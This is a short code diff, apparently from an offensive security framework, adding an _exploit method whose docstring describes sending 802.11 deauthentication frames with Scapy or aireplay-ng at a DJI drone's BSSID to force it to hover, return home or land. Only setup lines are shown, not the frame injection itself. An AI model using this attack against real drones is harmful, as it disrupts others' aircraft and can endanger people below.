@@ -97,6 +97,12 @@ class Exploit(Exploit):
         if not self._validate():
             return
 
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E deauth: inject 802.11 deauthentication frames targeting
+        the DJI drone BSSID via Scapy or aireplay-ng, forcing failsafe
+        (hover/RTH/land) when the controller loses connectivity."""
         simulate = bool(self.simulate)
         iface = str(self.interface).strip()
         bssid = str(self.target_bssid).strip()
